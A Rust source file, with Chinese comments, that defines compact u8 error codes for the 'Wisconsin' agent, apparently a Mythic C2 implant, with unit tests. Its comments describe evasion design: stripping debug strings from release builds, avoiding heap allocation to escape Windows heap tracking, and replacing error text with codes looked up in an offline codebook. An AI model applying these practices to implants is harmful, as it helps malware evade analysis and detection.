//! 全局错误类型定义与状态码契约
//!
//! 统一收敛 Agent 各功能模块的错误代号，杜绝类型漂移并规避内存/字符串分析特征。需要深入

// ==========================================
// 1. 加密与安全物理帧错误码 (Crypto)
// ==========================================

// 仅在 debug 或 test 下生成 Debug 派生，Release 模式下剔除以消除 .rdata 字符串指纹
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
#[derive(PartialEq, Eq, Clone, Copy)]
// 默认情况下,Rust拥有枚举内存布局的自主排布权.此处使用 #[repr(u8)] 强制其判别值(Discriminant)严格占用1字节,使整个错误枚举实例仅占1字节,对内存极限压缩友好
#[repr(u8)]
pub enum CryptoError {
    // === 10~19: 上下文初始化阶段 (Context / Init) ===
    /// 主密钥长度不符合 32 字节要求 (触发于 CryptoContext::new)
    MasterKeyInvalidLength = 10,

    // === 20~29: 封包加密阶段 (Seal / Outgoing) ===
    /// 传入的 Agent UUID 长度不为 36 字节
    SealUuidInvalidLength = 20,
    /// 待发送明文超过 MAX_PLAINTEXT_LEN 上限
    SealPlaintextTooLong = 21,
    /// 调用者提供的 raw_buf 二进制暂存区容量不足
    SealRawBufTooSmall = 22,
    /// 初始化 CBC 加密器失败 (密钥/IV 异常)
    SealCipherInitFailed = 23,
    /// AES-CBC 原地填充加密失败
    SealEncryptionFailed = 24,
    /// 初始化 HMAC 签名器失败
    SealHmacInitFailed = 25,
    /// 调用者提供的 out_b64 输出缓冲区不足以容纳 Base64 文本
    SealB64OutBufTooSmall = 26,

    // === 30~39: 解包验真阶段 (Open / Incoming) ===
    /// 服务端返回的数据不是合法的 Base64 编码
    OpenBase64DecodeFailed = 30,
    /// Base64 解码后二进制长度小于协议最小物理帧
    OpenPayloadTooShort = 31,
    /// 初始化 HMAC 验真器失败
    OpenHmacInitFailed = 32,
    /// HMAC-SHA256 签名校验失败 (数据被篡改或密钥不匹配)
    OpenHmacMismatch = 33,
    /// 初始化 CBC 解密器失败
    OpenCipherInitFailed = 34,
    /// AES-CBC 解密填充剔除失败 (PKCS#7 损坏或密文损坏)
    OpenDecryptionFailed = 35,
}

// 因为有Clone和Copy,这里并不会转移所有权,导致原变量失效
impl CryptoError {
    #[inline(always)]
    pub const fn code(self) -> u8 {
        self as u8
    }

    /// 根据数字代号反向还原枚举变体 (Const Codebook Lookup)
    pub const fn from_code(code: u8) -> Option<Self> {
        match code {
            10 => Some(Self::MasterKeyInvalidLength),
            20 => Some(Self::SealUuidInvalidLength),
            21 => Some(Self::SealPlaintextTooLong),
            22 => Some(Self::SealRawBufTooSmall),
            23 => Some(Self::SealCipherInitFailed),
            24 => Some(Self::SealEncryptionFailed),
            25 => Some(Self::SealHmacInitFailed),
            26 => Some(Self::SealB64OutBufTooSmall),
            30 => Some(Self::OpenBase64DecodeFailed),
            31 => Some(Self::OpenPayloadTooShort),
            32 => Some(Self::OpenHmacInitFailed),
            33 => Some(Self::OpenHmacMismatch),
            34 => Some(Self::OpenCipherInitFailed),
            35 => Some(Self::OpenDecryptionFailed),
            _ => None,
        }
    }
}

impl From<CryptoError> for u8 {
    #[inline(always)]
    fn from(err: CryptoError) -> Self {
        err.code()
    }
}

impl TryFrom<u8> for CryptoError {
    type Error = u8;

    #[inline(always)]
    fn try_from(code: u8) -> core::result::Result<Self, Self::Error> {
        Self::from_code(code).ok_or(code)
    }
}

// ==========================================
// 2. 文件传输与断点续传错误码密码本 (File Transfer / Resume)
// ==========================================

/// 文件传输状态机操作错误代号密码本 (File Transfer Error Codebook)
///
/// 严格限定为单字节 u8 判别值布局，无堆分配，Release 模式下杜绝任何明文字符串与符号信息。
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
#[derive(PartialEq, Eq, Clone, Copy)]
#[repr(u8)]
pub enum FileTransferError {
    // === 50~59: 状态机与服务端协议握手阶段 (Session & Handshake) ===
    /// 状态机处于不合法状态 (如尚未注册就尝试发数据或已传输完毕)
    InvalidState = 50,
    /// 缺少服务端分配的 File UUID
    MissingFileId = 51,
    /// 服务端返回非 success 状态
    ServerStatusError = 52,
    /// 断点续传回执中缺少 chunk_offset 字段
    ServerMissingOffset = 53,
    /// 偏移量超出文件总大小
    OffsetOutOfBounds = 54,
    /// 分片序号或字节偏移量不匹配 (如收到乱序分片)
    OffsetMismatch = 55,

    // === 60~69: 缓冲区与 I/O 编排阶段 (Buffer & I/O) ===
    /// 调用者提供的缓冲区容量过小
    BufferTooSmall = 60,
    /// Base64 编码或解码失败
    Base64Error = 61,
    /// 底层文件 I/O 读写失败
    IoError = 62,
}

impl FileTransferError {
    #[inline(always)]
    pub const fn code(self) -> u8 {
        self as u8
    }

    /// 根据数字代号反向还原枚举变体 (Const Codebook Lookup)
    pub const fn from_code(code: u8) -> Option<Self> {
        match code {
            50 => Some(Self::InvalidState),
            51 => Some(Self::MissingFileId),
            52 => Some(Self::ServerStatusError),
            53 => Some(Self::ServerMissingOffset),
            54 => Some(Self::OffsetOutOfBounds),
            55 => Some(Self::OffsetMismatch),
            60 => Some(Self::BufferTooSmall),
            61 => Some(Self::Base64Error),
            62 => Some(Self::IoError),
            _ => None,
        }
    }
}

impl From<FileTransferError> for u8 {
    #[inline(always)]
    fn from(err: FileTransferError) -> Self {
        err.code()
    }
}

impl TryFrom<u8> for FileTransferError {
    type Error = u8;

    #[inline(always)]
    fn try_from(code: u8) -> core::result::Result<Self, Self::Error> {
        Self::from_code(code).ok_or(code)
    }
}

// ==========================================
// 3. 协议解析与数据校验错误码 (Model / Protocol)
// ==========================================

/// Mythic 协议解析与数据校验错误代号密码本
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
#[derive(PartialEq, Eq, Clone, Copy)]
#[repr(u8)]
pub enum ModelError {
    /// 接口动作标志匹配失败或为空
    InvalidAction = 40,
    /// C2 服务端返回 status 不为 "success"
    ResponseStatusError = 41,
    /// 必填参数缺失或格式长度校验失败 (如 UUID 长度不为 36)
    MissingRequiredField = 42,
    /// 文件分片序号、偏移或总片数参数非法
    InvalidChunkInfo = 43,
    /// 交互式终端消息类型或编码异常
    InvalidInteractiveType = 44,
}

impl ModelError {
    #[inline(always)]
    pub const fn code(self) -> u8 {
        self as u8
    }

    /// 根据数字代号反向还原枚举变体 (Const Codebook Lookup)
    pub const fn from_code(code: u8) -> Option<Self> {
        match code {
            40 => Some(Self::InvalidAction),
            41 => Some(Self::ResponseStatusError),
            42 => Some(Self::MissingRequiredField),
            43 => Some(Self::InvalidChunkInfo),
            44 => Some(Self::InvalidInteractiveType),
            _ => None,
        }
    }
}

impl From<ModelError> for u8 {
    #[inline(always)]
    fn from(err: ModelError) -> Self {
        err.code()
    }
}

impl TryFrom<u8> for ModelError {
    type Error = u8;

    #[inline(always)]
    fn try_from(code: u8) -> core::result::Result<Self, Self::Error> {
        Self::from_code(code).ok_or(code)
    }
}

// ==========================================
// 4. HTTP 网络通信与传输层错误码 (Http / Transport)
// ==========================================

/// Profile 网络通信与传输层错误代号密码本
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
#[derive(PartialEq, Eq, Clone, Copy)]
#[repr(u8)]
pub enum HttpError {
    /// 封包阶段加密失败
    CryptoSealFailed = 70,
    /// 解包阶段解密或验签失败
    CryptoOpenFailed = 71,
    /// JSON 序列化失败
    JsonSerializeFailed = 72,
    /// JSON 反序列化失败
    JsonDeserializeFailed = 73,
    /// 网络传输或 Socket I/O 失败
    NetworkTransportFailed = 74,
    /// C2 服务端响应异常 (如 HTTP 状态码非 200 或业务状态 error)
    ServerResponseError = 75,
    /// 缓冲区容量溢出
    BufferOverflow = 76,
}

impl HttpError {
    #[inline(always)]
    pub const fn code(self) -> u8 {
        self as u8
    }

    /// 根据数字代号反向还原枚举变体 (Const Codebook Lookup)
    pub const fn from_code(code: u8) -> Option<Self> {
        match code {
            70 => Some(Self::CryptoSealFailed),
            71 => Some(Self::CryptoOpenFailed),
            72 => Some(Self::JsonSerializeFailed),
            73 => Some(Self::JsonDeserializeFailed),
            74 => Some(Self::NetworkTransportFailed),
            75 => Some(Self::ServerResponseError),
            76 => Some(Self::BufferOverflow),
            _ => None,
        }
    }
}

impl From<HttpError> for u8 {
    #[inline(always)]
    fn from(err: HttpError) -> Self {
        err.code()
    }
}

impl TryFrom<u8> for HttpError {
    type Error = u8;

    #[inline(always)]
    fn try_from(code: u8) -> core::result::Result<Self, Self::Error> {
        Self::from_code(code).ok_or(code)
    }
}

// ==========================================
// 5. Agent 核心状态机与任务调度错误码 (Agent Engine)
// ==========================================

/// Agent 核心运行状态机与调度错误代号密码本
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
#[derive(PartialEq, Eq, Clone, Copy)]
#[repr(u8)]
pub enum AgentError {
    /// 尚未完成上线注册 (Checkin)
    NotCheckedIn = 80,
    /// 服务端下发的回调 Callback UUID 非法
    InvalidCallbackUuid = 81,
    /// 任务执行异常
    TaskExecutionFailed = 82,
    /// 未知或未实现的命令
    UnknownCommand = 83,
    /// 系统环境元数据采集失败
    SysinfoFailed = 84,
    /// 网络传输与 I/O 交互失败
    TransportFailed = 85,
    /// 状态机会话状态非法
    InvalidSessionState = 86,
}

impl AgentError {
    #[inline(always)]
    pub const fn code(self) -> u8 {
        self as u8
    }

    /// 根据数字代号反向还原枚举变体 (Const Codebook Lookup)
    pub const fn from_code(code: u8) -> Option<Self> {
        match code {
            80 => Some(Self::NotCheckedIn),
            81 => Some(Self::InvalidCallbackUuid),
            82 => Some(Self::TaskExecutionFailed),
            83 => Some(Self::UnknownCommand),
            84 => Some(Self::SysinfoFailed),
            85 => Some(Self::TransportFailed),
            86 => Some(Self::InvalidSessionState),
            _ => None,
        }
    }
}

impl From<AgentError> for u8 {
    #[inline(always)]
    fn from(err: AgentError) -> Self {
        err.code()
    }
}

impl TryFrom<u8> for AgentError {
    type Error = u8;

    #[inline(always)]
    fn try_from(code: u8) -> core::result::Result<Self, Self::Error> {
        Self::from_code(code).ok_or(code)
    }
}

// ==========================================
// 6. Wisconsin 顶层统一收敛错误类型 (Unified Top-Level Error Facade)
// ==========================================

/// Wisconsin Agent 全局顶层统一错误收敛枚举.在这里某些上层调度中,在一个函数中需要返回不同的错误,如FileTransferError和CryptoError时.该函数只能返回WisconsinResult<()> .这时候聚合的WisconsinError就用上了.而在如transfer.rs中返回的都是FileTransferError.这里就不能用聚合的WisconsinError
///
/// ## 架构哲学与 OPSEC 契约
/// 1. **全链路 `?` 操作符传播支持**：
///    收敛底层的 5 大独立子模块错误（`CryptoError`、`ModelError`、`FileTransferError`、`HttpError`、`AgentError`），
///    通过标准 `From` 特征桥接，允许在跨层调度与异步/同步编排中直接使用 `?` 向上传播，
///    彻底杜绝原先通过 `map_err(|_| AgentError::SysinfoFailed)` 等失真强转手段导致的信息丢失与诊断盲区。
///
/// 2. **纯栈零堆与极限尺寸契约 (Zero-Heap / 2-Byte Footprint)**：
///    各子枚举均为 `#[repr(u8)]` 单字节布局，本顶层枚举内存占用仅为 2 字节（1 字节判别值 + 1 字节载荷），
///    可完全容纳于 CPU 寄存器或线程栈中，绝无动态堆分配，规避 Windows Segment Heap 追踪。
///
/// 3. **离线密码本特征擦除 (No Display / Stripped Debug in Release)**：
///    严格禁止实现 `core::fmt::Display`，杜绝任何明文错误描述进入 `.rdata` 节。
///    对外统一提供 `code(self) -> u8` 单字节代号，由离线密码本反查定位。
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
#[derive(PartialEq, Eq, Clone, Copy)]
pub enum WisconsinError {
    /// 加密与物理帧异常 (代号区间 10~39)
    Crypto(CryptoError),
    /// 协议解析与校验异常 (代号区间 40~49)
    Model(ModelError),
    /// 文件传输与分片续传异常 (代号区间 50~69)
    FileTransfer(FileTransferError),
    /// 网络传输与通信层异常 (代号区间 70~79)
    Http(HttpError),
    /// Agent 调度与会话状态机异常 (代号区间 80~89)
    Agent(AgentError),
}

impl WisconsinError {
    /// 提取全局唯一的单字节密码本错误代号 (0~255)
    #[inline(always)]
    pub const fn code(self) -> u8 {
        match self {
            Self::Crypto(e) => e.code(),
            Self::Model(e) => e.code(),
            Self::FileTransfer(e) => e.code(),
            Self::Http(e) => e.code(),
            Self::Agent(e) => e.code(),
        }
    }

    /// 根据数字代号反向还原顶层错误枚举变体 (Const Codebook Lookup)
    pub const fn from_code(code: u8) -> Option<Self> {
        match code {
            10..=39 => match CryptoError::from_code(code) {
                Some(e) => Some(Self::Crypto(e)),
                None => None,
            },
            40..=49 => match ModelError::from_code(code) {
                Some(e) => Some(Self::Model(e)),
                None => None,
            },
            50..=69 => match FileTransferError::from_code(code) {
                Some(e) => Some(Self::FileTransfer(e)),
                None => None,
            },
            70..=79 => match HttpError::from_code(code) {
                Some(e) => Some(Self::Http(e)),
                None => None,
            },
            80..=89 => match AgentError::from_code(code) {
                Some(e) => Some(Self::Agent(e)),
                None => None,
            },
            _ => None,
        }
    }

    /// 判断是否属于密码学层错误
    #[inline(always)]
    pub const fn is_crypto(&self) -> bool {
        matches!(self, Self::Crypto(_))
    }

    /// 判断是否属于协议校验层错误
    #[inline(always)]
    pub const fn is_model(&self) -> bool {
        matches!(self, Self::Model(_))
    }

    /// 判断是否属于文件传输层错误
    #[inline(always)]
    pub const fn is_file_transfer(&self) -> bool {
        matches!(self, Self::FileTransfer(_))
    }

    /// 判断是否属于网络通信层错误
    #[inline(always)]
    pub const fn is_http(&self) -> bool {
        matches!(self, Self::Http(_))
    }

    /// 判断是否属于核心引擎层错误
    #[inline(always)]
    pub const fn is_agent(&self) -> bool {
        matches!(self, Self::Agent(_))
    }

    /// 尝试借用内部的 CryptoError
    #[inline(always)]
    pub const fn as_crypto(&self) -> Option<CryptoError> {
        match *self {
            Self::Crypto(e) => Some(e),
            _ => None,
        }
    }

    /// 尝试借用内部的 ModelError
    #[inline(always)]
    pub const fn as_model(&self) -> Option<ModelError> {
        match *self {
            Self::Model(e) => Some(e),
            _ => None,
        }
    }

    /// 尝试借用内部的 FileTransferError
    #[inline(always)]
    pub const fn as_file_transfer(&self) -> Option<FileTransferError> {
        match *self {
            Self::FileTransfer(e) => Some(e),
            _ => None,
        }
    }

    /// 尝试借用内部的 HttpError
    #[inline(always)]
    pub const fn as_http(&self) -> Option<HttpError> {
        match *self {
            Self::Http(e) => Some(e),
            _ => None,
        }
    }

    /// 尝试借用内部的 AgentError
    #[inline(always)]
    pub const fn as_agent(&self) -> Option<AgentError> {
        match *self {
            Self::Agent(e) => Some(e),
            _ => None,
        }
    }
}

// ----------------- From 特征实现: 零开销无缝向上转换 -----------------

impl From<CryptoError> for WisconsinError {
    #[inline(always)]
    fn from(err: CryptoError) -> Self {
        Self::Crypto(err)
    }
}

impl From<ModelError> for WisconsinError {
    #[inline(always)]
    fn from(err: ModelError) -> Self {
        Self::Model(err)
    }
}

impl From<FileTransferError> for WisconsinError {
    #[inline(always)]
    fn from(err: FileTransferError) -> Self {
        Self::FileTransfer(err)
    }
}

impl From<HttpError> for WisconsinError {
    #[inline(always)]
    fn from(err: HttpError) -> Self {
        Self::Http(err)
    }
}

impl From<AgentError> for WisconsinError {
    #[inline(always)]
    fn from(err: AgentError) -> Self {
        Self::Agent(err)
    }
}

impl From<WisconsinError> for u8 {
    #[inline(always)]
    fn from(err: WisconsinError) -> Self {
        err.code()
    }
}

impl TryFrom<u8> for WisconsinError {
    type Error = u8;

    #[inline(always)]
    fn try_from(code: u8) -> core::result::Result<Self, Self::Error> {
        Self::from_code(code).ok_or(code)
    }
}

/// Wisconsin 统一结果类型别名
pub type WisconsinResult<T> = core::result::Result<T, WisconsinError>;

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_crypto_error_code() {
        assert_eq!(CryptoError::MasterKeyInvalidLength.code(), 10);
        assert_eq!(CryptoError::SealUuidInvalidLength.code(), 20);
        assert_eq!(CryptoError::OpenBase64DecodeFailed.code(), 30);
    }

    #[test]
    fn test_file_transfer_error_code() {
        assert_eq!(FileTransferError::InvalidState.code(), 50);
        assert_eq!(FileTransferError::MissingFileId.code(), 51);
        assert_eq!(FileTransferError::ServerStatusError.code(), 52);
        assert_eq!(FileTransferError::BufferTooSmall.code(), 60);
        assert_eq!(FileTransferError::Base64Error.code(), 61);
        assert_eq!(FileTransferError::IoError.code(), 62);
    }

    #[test]
    fn test_model_and_http_error_code() {
        assert_eq!(ModelError::InvalidAction.code(), 40);
        assert_eq!(ModelError::InvalidInteractiveType.code(), 44);
        assert_eq!(HttpError::CryptoSealFailed.code(), 70);
        assert_eq!(HttpError::BufferOverflow.code(), 76);
        assert_eq!(AgentError::NotCheckedIn.code(), 80);
        assert_eq!(AgentError::UnknownCommand.code(), 83);
        assert_eq!(AgentError::SysinfoFailed.code(), 84);
        assert_eq!(AgentError::TransportFailed.code(), 85);
        assert_eq!(AgentError::InvalidSessionState.code(), 86);
    }

    #[test]
    fn test_sub_errors_from_code_and_try_from() {
        assert_eq!(CryptoError::try_from(10), Ok(CryptoError::MasterKeyInvalidLength));
        assert_eq!(CryptoError::try_from(99), Err(99));
        assert_eq!(FileTransferError::try_from(50), Ok(FileTransferError::InvalidState));
        assert_eq!(ModelError::try_from(40), Ok(ModelError::InvalidAction));
        assert_eq!(HttpError::try_from(70), Ok(HttpError::CryptoSealFailed));
        assert_eq!(AgentError::try_from(80), Ok(AgentError::NotCheckedIn));
    }

    #[test]
    fn test_wisconsin_error_unified_propagation_and_question_mark() {
        // 模拟各子系统返回不同错误，由使用 WisconsinResult 的上层函数统一通过 `?` 接收
        fn do_crypto() -> Result<(), CryptoError> {
            Err(CryptoError::MasterKeyInvalidLength)
        }

        fn do_model() -> Result<(), ModelError> {
            Err(ModelError::InvalidAction)
        }

        fn do_transfer() -> Result<(), FileTransferError> {
            Err(FileTransferError::ServerStatusError)
        }

        fn do_http() -> Result<(), HttpError> {
            Err(HttpError::NetworkTransportFailed)
        }

        fn do_agent() -> Result<(), AgentError> {
            Err(AgentError::NotCheckedIn)
        }

        fn run_pipeline(step: u8) -> WisconsinResult<()> {
            match step {
                1 => { do_crypto()?; Ok(()) }
                2 => { do_model()?; Ok(()) }
                3 => { do_transfer()?; Ok(()) }
                4 => { do_http()?; Ok(()) }
                5 => { do_agent()?; Ok(()) }
                _ => Ok(()),
            }
        }

        assert_eq!(run_pipeline(1), Err(WisconsinError::Crypto(CryptoError::MasterKeyInvalidLength)));
        assert_eq!(run_pipeline(1).unwrap_err().code(), 10);

        assert_eq!(run_pipeline(2), Err(WisconsinError::Model(ModelError::InvalidAction)));
        assert_eq!(run_pipeline(2).unwrap_err().code(), 40);

        assert_eq!(run_pipeline(3), Err(WisconsinError::FileTransfer(FileTransferError::ServerStatusError)));
        assert_eq!(run_pipeline(3).unwrap_err().code(), 52);

        assert_eq!(run_pipeline(4), Err(WisconsinError::Http(HttpError::NetworkTransportFailed)));
        assert_eq!(run_pipeline(4).unwrap_err().code(), 74);

        assert_eq!(run_pipeline(5), Err(WisconsinError::Agent(AgentError::NotCheckedIn)));
        assert_eq!(run_pipeline(5).unwrap_err().code(), 80);

        assert!(run_pipeline(6).is_ok());
    }

    #[test]
    fn test_wisconsin_error_from_code_roundtrip() {
        let codes = [
            10, 20, 21, 22, 23, 24, 25, 26, 30, 31, 32, 33, 34, 35, // Crypto
            40, 41, 42, 43, 44,                                     // Model
            50, 51, 52, 53, 54, 55, 60, 61, 62,                     // FileTransfer
            70, 71, 72, 73, 74, 75, 76,                             // Http
            80, 81, 82, 83, 84, 85, 86,                             // Agent
        ];

        for &c in &codes {
            let err = WisconsinError::from_code(c).expect("valid codebook discriminant must parse");
            assert_eq!(err.code(), c);
            assert_eq!(u8::from(err), c);
            assert_eq!(WisconsinError::try_from(c), Ok(err));
        }

        // 测试无效代码
        assert_eq!(WisconsinError::from_code(0), None);
        assert_eq!(WisconsinError::from_code(99), None);
        assert_eq!(WisconsinError::try_from(99), Err(99));
    }

    #[test]
    fn test_wisconsin_error_memory_compactness() {
        // 验证全局错误枚举的大小不超过 2 字节（纯栈微型布局，寄存器容纳）
        assert!(core::mem::size_of::<WisconsinError>() <= 2);
        assert_eq!(core::mem::size_of::<CryptoError>(), 1);
        assert_eq!(core::mem::size_of::<FileTransferError>(), 1);
        assert_eq!(core::mem::size_of::<ModelError>(), 1);
        assert_eq!(core::mem::size_of::<HttpError>(), 1);
        assert_eq!(core::mem::size_of::<AgentError>(), 1);
    }

    #[test]
    fn test_wisconsin_error_helper_methods() {
        let err: WisconsinError = CryptoError::OpenHmacMismatch.into();
        assert!(err.is_crypto());
        assert!(!err.is_http());
        assert_eq!(err.as_crypto(), Some(CryptoError::OpenHmacMismatch));
        assert_eq!(err.as_http(), None);
        assert_eq!(err.code(), 33);
    }
}

